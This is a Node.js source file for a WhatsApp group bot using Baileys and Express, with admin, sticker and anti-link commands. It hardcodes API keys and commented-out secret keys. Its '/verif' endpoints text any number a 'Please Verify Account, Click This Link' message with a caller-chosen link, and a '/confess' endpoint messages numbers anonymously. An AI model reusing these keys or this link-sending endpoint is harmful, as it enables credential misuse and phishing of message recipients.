const fs = require('fs-extra')
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, proto, generateWAMessageFromContent, generateWAMessage, areJidsSameUser, makeInMemoryStore, jidDecode, Browsers } = require("@adiwajshing/baileys")
const { DisconnectReason } = require('@adiwajshing/baileys')
const pino = require('pino')
const moment = require('moment-timezone')

moment.tz.setDefault('Asia/Jakarta').locale('id')
const { Sticker } = require('wa-sticker-formatter')
const speed = require('performance-now')
const axios = require('axios')
const express = require('express')
const multer = require('multer')
const secure = require('ssl-express-www');
const cors = require('cors');
const bodyParser = require('body-parser');

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

store.readFromFile('./baileys_store1.json')
// saves the state to a file every 10s
setInterval(() => {
  store.writeToFile('./baileys_store1.json')
}, 10_000)

// const API_KEY = 'b6707da159a61c9bbf1a0a23b32ad1f3';
// const { Configuration, OpenAIApi } = require("openai");

// let apikey = ["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", "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", "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", "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", "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", "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"]
// function getRandomApi() {
//   // Get a random index from the array
//   const randomIndex = Math.floor(Math.random() * apikey.length);
//   // Return the string at the random index
//   return apikey[randomIndex];
// }

// const configuration = new Configuration({
//   apiKey: getRandomApi(),
// });
// const openai = new OpenAIApi(configuration);

// var ScreenshotApi = require('screenshotapi');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(cors());
app.use(secure);
app.get('/', (req, res) => {
  res.send('Hello World!')
})


async function start() {
  const { state, saveCreds } = await useMultiFileAuthState('./auth')
  __path = process.cwd()


  const getGroupAdmins = (participants) => {
    admins = ["6281414046576@s.whatsapp.net"]
    for (let i of participants) {
      i.admin === "admin" || i.admin === "superadmin" ? admins.push(i.id) : ''
    }
    return admins
  }

  const get = (from, _dir) => {
    let position = null
    Object.keys(_dir).forEach((i) => {
      if (_dir[i].id === from) {
        position = i
      }
    })
    if (position !== null) {
      return position
    }
  }


  const checkgroup = (userId, _dir) => {
    let status = false
    Object.keys(_dir).forEach((i) => {
      if (_dir[i].id === userId) {
        status = true
      }
    })
    return status
  }


  async function newsticker(img) {
    const stickerMetadata = {
      type: 'full', //can be full or crop
      pack: 'punya',
      author: 'piyo',
      categories: 'deswita',
    }
    return await new Sticker(img, stickerMetadata).build()
  }

  const checkteks = (userId, _dir) => {
    let position = null
    Object.keys(_dir).forEach((i) => {
      if (_dir[i].id === userId) {
        position = i
      }
    })
    if (position !== null) {
      return _dir[position].text
    }
  }

  const conn = makeWASocket({
    logger: pino({ level: 'silent' }),
    printQRInTerminal: true,
    auth: state,
    browser: Browsers.macOS("Desktop"),
    downloadHistory: false,
    syncFullHistory: false,
    getMessage: async key => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id)
        return msg?.message || undefined
      }

      // only if store is present
      return {
        conversation: 'hello'
      }
    }
  })

  store.bind(conn.ev)




  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
      lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? start() : console.log('Koneksi Terputus...')
    }
    console.log('Koneksi Terhubung...')
  })

  conn.decodeJid = (jid) => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {}
      return decode.user && decode.server && decode.user + '@' + decode.server || jid
    } else return jid
  }
  conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
  }

  conn.ev.on('creds.update', saveCreds)
  app.post('/confess', multer().none(), async (req, res) => {
    let { nomor, text } = req.body
    if (nomor.startsWith('08')) {
      nomor = nomor.replace('08', "628")
    }
    nomor = nomor + "@s.whatsapp.net"
    const [result] = await conn.onWhatsApp(nomor)
    if (!result) return
    if (result.exists) {
      let texp = `Message : ${text}\n\nBot Confess\nCheck In https://piyo.my.id`
      conn.sendMessage(nomor, { text: texp })
      return res.jsonp({ data: "Berhasil Kirim Pesan" })
    } else {
      return res.jsonp({ data: "Nomor Tidak Ada Di whatsapp " })
    }
  })
  app.post('/verif', multer().none(), async (req, res) => {
    const getBuffer = async (url, options) => {
      try {
        options ? options : {}
        const res = await axios({
          method: "get",
          url,
          headers: {
            'DNT': 1,
            'Upgrade-Insecure-Request': 1
          },
          ...options,
          responseType: 'arraybuffer'
        })
        return res.data
      } catch (e) {
        console.log(`Error : ${e}`)
      }
    }
    phone = req.body.phoneNumber;
    phone = phone.replace("08", "628")
    conn.sendMessage(phone + "@s.whatsapp.net", {
      image: { url: 'https://2.bp.blogspot.com/-O6wiXvB2WJU/XBkkyqPxR0I/AAAAAAAABl8/Qm1nwNh9ggEPzX22ZpFRmfSjjfL9IKWcgCLcBGAs/s1600/images.png' },
      jpegThumbnail: await getBuffer('https://2.bp.blogspot.com/-O6wiXvB2WJU/XBkkyqPxR0I/AAAAAAAABl8/Qm1nwNh9ggEPzX22ZpFRmfSjjfL9IKWcgCLcBGAs/s1600/images.png'),
      caption: "Please Verify Account , Click This Link\n " + req.body.link
    })
    res.jsonp({ status: "success" })
  })
  conn.ev.on('messages.upsert', async chatUpdate => {
    try {
      m = chatUpdate
      m = m.messages[0]
      if (!m.message) return
      if (m.key && m.key.remoteJid == 'status@broadcast') return;
      if (m.key.fromMe) return
      const content = JSON.stringify(m.message)
      m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
      let type = Object.keys(m.message)
      type = (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || type[0]
      const from = m.key.remoteJid
      const isGroup = from.endsWith('@g.us')
      const botNumber = conn.user.id ? conn.user.id.split(":")[0] + "@s.whatsapp.net" : conn.user.id
      const budo = (type === 'conversation' && m.message.conversation.startsWith('.')) ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.title || m.text) : ''
      const budy = (type === 'conversation') ? m.message.conversation : ''
      const body = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.title || m.text) : ''
      const bude = (type === 'conversation' && m.message.conversation.startsWith('.')) ? m.message.conversation : ''
      const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
      const groupMembers = isGroup ? await groupMetadata.participants : ''
      const groupName = isGroup ? groupMetadata.subject : ''
      const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : ''
      const participants = isGroup ? await groupMetadata.participants : ''
      const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
      const sender = isGroup ? m.key.participant : m.key.remoteJid
      const isGroupAdmins = isGroup ? groupAdmins.includes(sender) || from === "6281414046576@s.whatsapp.net" : false
      const args = body.trim().split(/ +/).slice(1)
      const argss = bude.trim().split(/ +/).slice(1)
      const ownernumber = '6281414046576@s.whatsapp.net'
      const isOwner = from == ownernumber
      const command = budo.slice(1).trim().split(/ +/).shift().toLowerCase()

      const q = args.join(' ')
      const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
      const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
      const isQuoted = type === 'extendedTextMessage' && content.includes('text')

      const reply = (text) => {
        conn.sendMessage(from, {
          text: text
        })
      }

      if (isGroup) {
        let y = m
        if (y.message.conversation.length > 40000) {
          conn.sendMessage(from, { delete: y.key })
          conn.groupParticipantsUpdate(from, [t.key.participants], "remove")
        }
      }


      global.data = global.data ? global.data : []
      global.conns = global.conns ? global.conns : []

      if (type === "conversation" || type === "extendedTextMessage") {
        if (body.match(new RegExp(/(https:\/\/chat.whatsapp.com)/gi))) {
          if (isOwner) {
            try {
              join = body.split('https://chat.whatsapp.com/')[1]
              await conn.groupAcceptInvite(join).then(async (data) => {
                await conn.sendMessage(from, { text: 'Succes Join To Grup' })
              })
            } catch (err) {
              console.log(err)
            }
          } else {
            let t = m
            const pe = JSON.parse(fs.readFileSync('anti.json'))
            if (!pe.includes(from)) return
            if (isGroupAdmins) return
            await conn.sendMessage(from, { text: "*Anti Link*\n\nDilarang Mengirimkan Link Grup Lain" }, { quoted: t })
            await conn.sendMessage(from, { delete: t.key })
            await conn.groupParticipantsUpdate(from, [sender], "remove")
          }
        }
      }

      if (from === "6285784631102@s.whatsapp.net") {
        if (body.length !== 0) {
          const p = await axios.get('https://api.lolhuman.xyz/api/simi?apikey=eaec2799935013be72f52472&text=' + body)
          reply(p.data.result)
        }
      } else {

        if (body == '.' || body == 'lazada' || body === 'tagall' || body == ".dor" || body == ".light") {
          if (isGroup && isGroupAdmins) {
            teks = (args.length > 1) ? body.slice(8).trim() : ''
            teks += `  Total : ${groupMembers.length}\n`
            for (let mem of groupMembers) {
              teks += `╠➥ @${mem.id.split('@')[0]}\n`
            }
            conn.sendMessage(from, { text: '╔══✪〘 Mention All 〙✪══\n╠➥' + teks + `╚═〘 ${groupName} 〙`, mentions: participants.map(a => a.id) })
          }
        }
        if (isGroupAdmins) {
          const cmd = bude.slice(1).trim().split(/ +/).shift().toLowerCase()
          const wel = JSON.parse(fs.readFileSync('welcome.json'))
          const q = argss.join(' ')
          if (cmd === "welcome") {
            if (checkgroup(from, wel) === true) {
              let posi = wel[get(from, wel)]
              posi.text = q
              fs.writeFileSync('welcome.json', JSON.stringify(wel, null, '\t'))
              conn.sendMessage(from, { text: 'sukses' })
            } else {
              obj = { id: from, text: q }
              wel.push(obj)
              fs.writeFileSync('welcome.json', JSON.stringify(wel))
              conn.sendMessage(from, { text: 'sukses' })
            }
          }
        }

        if (body === ".anti") {
          if (!isGroupAdmins) return
          const per = m
          const pe = JSON.parse(fs.readFileSync('anti.json'))
          if (pe.includes(from)) {
            let tep = pe.indexOf(from)
            pe.splice(tep, 1)
            fs.writeFileSync('anti.json', JSON.stringify(pe))
            return conn.sendMessage(from, { text: "Sukses Matikan Shield Groupp" }, { quoted: per })
          }
          pe.push(from)
          fs.writeFileSync('anti.json', JSON.stringify(pe))
          conn.sendMessage(from, { text: "Sukses Aktifkan Shield Group" }, { quoted: per })
        }


        if (body === "test5") {
          console.log(from)
        }


        if (body === "haha") {
          console.log(conn.user[from])
        }




        if (body == "speed") {
          const timestampi = speed();
          const latensip = speed() - timestampi
          conn.sendMessage(from, { text: `${latensip.toFixed(4)} Second` })
        }

        if (body === "test") {
          console.log('test juga')
        }

        if (body === "test4") {
          reply("Test yo")
        }


        if (body == "halo") {
          if (isGroup && isGroupAdmins) {
            var options = {
              text: 'halo semua',
              mentions: participants.map(a => a.id)
            }
            conn.sendMessage(from, options)
          }
        }
        if (body == "halo2") {
          if (isGroup && isGroupAdmins) {
            var options = {
              text: 'jajan yuk gais',
              mentions: participants.map(a => a.id)
            }
            conn.sendMessage(from, options)
          }
        }

        const sleep = async (ms) => {
          return new Promise(resolve => setTimeout(resolve, ms));
        }
        // if (body === "sstest") {
        //   console.log('test')
        //   var captureRequest = {
        //     url: "https://Bot100k.piyoxz.repl.co",
        //     webdriver: 'chrome',
        //     viewport: '1280x1024',
        //     fullpage: false,
        //     javascript: true
        //   };
        //   ScreenshotApi.getScreenshotReturningTemporaryUrl(
        //     API_KEY,        // your api key
        //     captureRequest, // the site to capture and your settings
        //     './'            // local path to store the screenshot png
        //   )
        //     .then(async (url) => {
        //       await conn.sendMessage(from, { image: { url: url } })
        //     })
        //     .catch((err) => {
        //       console.error('Error capturing screenshot:', err);
        //     })
        // }
        if (from === "6281414046576@s.whatsapp.net" || from === "6283878761652@s.whatsapp.net" || isGroupAdmins) {
          if (body === 'ping') {
            const getBuffer = async (url, options) => {
              try {
                options ? options : {}
                const res = await axios({
                  method: "get",
                  url,
                  headers: {
                    'DNT': 1,
                    'Upgrade-Insecure-Request': 1
                  },
                  ...options,
                  responseType: 'arraybuffer'
                })
                return res.data
              } catch (e) {
                console.log(`Error : ${e}`)
              }
            }
            const link = ["https://Bot100k.piyoxz.repl.co", "https://BOT100K2.piyoxz.repl.co", "https://bot120k.piyoxz.repl.co", "https://bot120k2.piyoxz.repl.co", "https://bot13.piyoxz.repl.co", "https://bot18.piyoxz.repl.co", "https://bot26.piyoxz.repl.co", "https://bot27.piyoxz.repl.co", "https://bot31.piyoxz.repl.co", "https://bot33.piyoxz.repl.co"]
            for (let i = 0; i < link.length; i++) {
              await axios.get(link[i])
                .then(res => {
                  console.log("success")
                })
                .catch(err => {
                  console.log("err")
                })
              conn.sendMessage(from, { image: await getBuffer("https://saipulanuar.ga/api/download/ssweb?url=" + link[i]), caption: link[i] });
            }
            await conn.sendMessage(from, { text: "Succes ping " + link.length + " website" })
          }
        }

        app.post('/verif', async (req, res) => {
          phone = req.body.phoneNumber;
          phone = phone.replace("08", "62")
          conn.sendMessage(phone + "@s.whatsapp.net", {
            text: "Please Verify Account , Click This Link\n " + req.body.link
          })
          res.jsonp({ status: "success" })
        })


        if (body == "haechan" || body === "bestie" || body === "cilukba") {
          if (isGroup && isGroupAdmins) {
            conn.sendPresenceUpdate('composing', from)
            ini_buffer = await fs.readFileSync('haechan.webp');
            conn.sendMessage(from, { sticker: ini_buffer, mentions: participants.map(a => a.id) })
          }
        } else if (body == "Piyak" || body == "piyak" || body === ".piw") {
          if (isGroup && isGroupAdmins) {
            conn.sendPresenceUpdate('composing', from)
            ini_buffer = await fs.readFileSync('2.webp');
            conn.sendMessage(from, { sticker: ini_buffer, mentions: participants.map(a => a.id) })
          }
        }


        if (body === "tage") {
          conn.sendMessage(from, { text: 'test' })
        }

        if (body === "hidetag") {
          if (!isGroup) return reply('Harus Di Grup')
          if (!isGroupAdmins) return
          var opsi = {
            text: '',
            mentions: participants.map(a => a.id)
          }
          conn.sendMessage(from, opsi)
        }


        switch (command) {
          case 'tag':
            if (!isGroup) return reply('Harus Di Grup')
            if (!isGroupAdmins) return
            var options = {
              text: q,
              mentions: participants.map(a => a.id)
            }
            conn.sendMessage(from, options)
            break
          case 'ttp':
            const sti = await axios.get('https://botcahx.ddns.net/api/maker/attp?text=' + q)
            console.log(sti)
            await fs.writeFileSync(`./media/image/${q}.gif`, sti.result.data)
            const resultt = await newsticker(`./media/image/${q}.gif`)
            await conn.sendMessage(from, { sticker: resultt, isAnimated: true }, { quoted: m })
            fs.unlinkSync(`./media/image/${q}`)
            break
          case 'menu':
            menu = `╔══✪ 〘 *MENU PIYOBOT* 〙✪══
╠➥  .sticker
╠➥  .getsticker textnya berapa
╠➥  .twitter linknya
╠➥  .welcome textnya 
╠➥  .tag textnya
╠➥  .open
╠➥  .close
╠➥  .anti
╠➥  tagall
╠➥  hidetag\n`
            if (isGroup) {
              if (q) {
                if (!isGroupAdmins) return
                menu += "╠➥  " + q
                conn.sendMessage(from, { text: menu + `\n╚═〘 ${groupName} 〙` })
              } else {
                conn.sendMessage(from, { text: menu + `╚═〘 ${groupName} 〙` })
              }
            } else {
              conn.sendMessage(from, { text: menu + `╚═〘 Piyobot 〙` })
            }
            break;
          case 'sad':
            try {
              const getBuffer = async (url, options) => {
                try {
                  options ? options : {}
                  const res = await axios({
                    method: "get",
                    url,
                    headers: {
                      'DNT': 1,
                      'Upgrade-Insecure-Request': 1
                    },
                    ...options,
                    responseType: 'arraybuffer'
                  })
                  return res.data
                } catch (e) {
                  console.log(`Error : ${e}`)
                }
              }
              const ApiVideo = "https://hahaha.piyoxz.repl.co"
              const ResultData = await axios.get(ApiVideo)
              conn.sendMessage(from, { video: await getBuffer(ResultData.data[0].url), caption: "Video Random #" + ResultData.data[0].id })
            } catch (err) {
              reply("Tidak Ada Kesedihan hari ini");
            }
            break
          case 'twitter':
            if (!q) return reply("ketik /tiwtter linknya")
            try {
              const twt = await axios.get('https://api.lolhuman.xyz/api/twitter2?apikey=9607da9c9ea31ec4f4909e76&url=' + q)
              const tw = twt.data.result
              const func = async (url) => {
                const response = await axios(url, { responseType: 'arraybuffer' })
                const buffer64 = Buffer.from(response.data, 'binary').toString('base64')
                return buffer64
              }
              conn.sendMessage(from, { video: { url: tw.link[0].url }, jpegThumbnail: func(tw.thumbnail) })
            } catch (err) {
              conn.sendMessage(from, { text: 'Error Downloads' + err });
            }
            break
          // case 'gambar':
          //   if (!q) return reply('error');
          //   try {
          //     const respone = await openai.createImage({
          //       prompt: q,
          //       n: 1,
          //       size: "512x512",
          //     })
          //     conn.sendMessage(from, { image: { url: respone.data.data[0].url }, caption: 'Nih Gambarnya' })
          //   } catch (err) {
          //     reply(err);
          //   }
          //   break
          case 'getsticker':
            return reply("maintance")
            if (!q) return reply("caranya adalah ketik .getsticker cariapa berapa");
            se = q
            se = se.split(' ')
            if (se[1] == null || se[1] == "" || se[1] == undefined) return reply("caranya adalah ketik .getsticker cariapa berapa");
            if (se[1] > 10) return reply("terlalu banyak hehehe");
            try {
              const gt = await axios.get('https://api.lolhuman.xyz/api/stickerwa?apikey=9607da9c9ea31ec4f4909e76&query=' + se[0])
              gte = gt.data.result[0].stickers
              for (let i = 0; i < se[1]; i++) {
                conn.sendMessage(from, { sticker: { url: gte[i] } })
              }
              conn.sendMessage(from, { text: 'selesai' })
            } catch (err) {
              conn.sendMessage(from, { text: 'Error' })
            }
            break
          case 's':
          case 'sticker':
            if (type === 'videoMessage' || isQuotedVideo) return reply('Image Only')
            const testt = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : m.message.imageMessage
            const stream = await downloadContentFromMessage(testt, 'image')
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
              buffer = Buffer.concat([buffer, chunk])
            }
            const getRandom = (ext) => {
              return `${Math.floor(Math.random() * 10000)}${ext}`
            }
            ran = getRandom('.jpeg')
            await fs.writeFileSync(`./media/image/${ran}`, buffer)
            const result = await newsticker(`./media/image/${ran}`)
            await conn.sendMessage(from, { sticker: result }, { quoted: m })
            fs.unlinkSync(`./media/image/${ran}`)
            break
          case 'test':
            break
          case 'kick':
            if (isGroup && isGroupAdmins) {
              if (!isBotGroupAdmins) return reply("Bot Bukan Admin")
              if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply("caranya ketik /kick @mention")
              mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
              const response = await conn.groupParticipantsUpdate(
                from,
                mentioned,
                "remove"
              )
              conn.sendMessage(from, { text: "Sukses Kick" })
            } else {
              conn.sendMessage(from, { text: "Kamu Bukan Admin" });
            }
            break
          case 'open':
            if (isGroup && isGroupAdmins) {
              if (!isBotGroupAdmins) return reply("Bot Bukan Admin")
              await conn.groupSettingUpdate(from, 'not_announcement')
              conn.sendMessage(from, { text: "Sukses Open Group", mentions: participants.map(a => a.id) })
            } else {
              conn.sendMessage(from, { text: "Kamu Bukan Admin" });
            }
            break
          case 'close':
            if (isGroup && isGroupAdmins) {
              if (!isBotGroupAdmins) return reply("Bot Bukan Admin")
              await conn.groupSettingUpdate(from, 'announcement')
              conn.sendMessage(from, { text: "Sukses Close Group", mentions: participants.map(a => a.id) })
            } else {
              conn.sendMessage(from, { text: "Kamu Bukan Admin" });
            }
            break
          default:
        }
      }
    } catch (err) {
      console.log(err.message)
    }
  })


  conn.ev.on('group-participants.update', async mem => {
    let pek = mem.participants.toString()
    if (!pek.startsWith('62' || '60')) {
      await conn.sendMessage(mem.id, { text: "Orang Luar Terdeteksi\n\nOtomatis Kick" })
      return await conn.groupParticipantsUpdate(mem.id, [mem.participants], "remove")
    }
    parseMention = (text = '') => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    const gp = JSON.parse(fs.readFileSync('welcome.json'))
    isGroup = mem.id.endsWith('@g.us')
    if (checkgroup(mem.id, gp) === true) {
      if (mem.action == 'add') {
        const teks2 = await checkteks(mem.id, gp)
        await conn.sendMessage(mem.id, { text: teks2 })
      }
    }
    const groupMetadata = isGroup ? await conn.groupMetadata(mem.id) : ''
    const groupMembers = isGroup ? await groupMetadata.participants : ''
    const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : ''

    if (mem.id === "120363040291467791@g.us") {
      if (mem.action == 'add') {
        teks4 = `welcome to My Time

Pertanyaan seputar orderan bisa menghubungi  @6285855259901 atau @6289521855655

Enjoy your time with mytime 🤍`
        await conn.sendMessage("120363040291467791@g.us", { text: teks4, mentions: groupAdmins.map(a => a) })
      }
    }
    if (mem.id === "6281270278196-1630299263@g.us") {
      if (mem.action == 'add') {
        const teks3 = `*HALO YANG BARU MASUK DI GRUP ARMY BANGTAN FAMILY*
   *semoga betahh yahh*
❗  *DI BAF wajib save no ADMIN disini ada 4 ADMIN*
❗  *pc LEADER stan kamu*
❗  *Dilarang spam yang tidak jelas*
❗  *Wajib nimbrung, jika ada halangan silahkan hubungi admin*
❗   *Absen setiap hari link ada di info grup*`
        await conn.sendMessage(mem.id, { text: teks3, mentions: groupAdmins.map(a => a) })
      }
    } else if (mem.id === "120363025082227077@g.us") {
      if (mem.action == 'add') {
        const getBuffer = async (url, options) => {
          try {
            options ? options : {}
            const res = await axios({
              method: "get",
              url,
              headers: {
                'DNT': 1,
                'Upgrade-Insecure-Request': 1
              },
              ...options,
              responseType: 'arraybuffer'
            })
            return res.data
          } catch (e) {
            console.log(`Error : ${e}`)
          }
        }
        size = groupMetadata.size
        size = parseInt(size)
        const pp = await getBuffer('https://piyo-api.piyoxz.repl.co/welcome?size=' + size)
        const caption = `Selamat Datang @${mem.participants[0].split('@')[0]}`
        await conn.sendMessage(mem.id, { image: pp, caption: caption, mentions: [mem.participants[0]] })
      }
    }
  })

}

start()

app.listen(5000, '0.0.0.0', function() {
  console.log(`Example app listening at http://localhost:${port}`)
})